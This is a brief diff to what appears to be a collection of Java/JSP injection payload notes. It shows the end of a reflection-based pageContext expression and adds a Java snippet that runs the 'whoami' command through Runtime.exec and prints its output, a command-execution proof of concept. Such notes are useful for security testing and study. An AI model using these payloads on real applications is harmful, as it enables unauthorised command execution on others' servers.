@@ -20,3 +20,12 @@ pageContext.setAttribute("stringRes", pageContext.getAttribute("stringConstructo
 pageContext.getAttribute("stringRes")
 }
 ```
+
+```java
+InputStream whoami = Runtime.getRuntime().exec("whoami").getInputStream();
+Thread.sleep(100);
+int whoami1 = whoami.available();
+byte[] array = ByteBuffer.allocate(100).array();
+whoami.read(array, 0, whoami1);
+System.out.println(new String(array));
+```
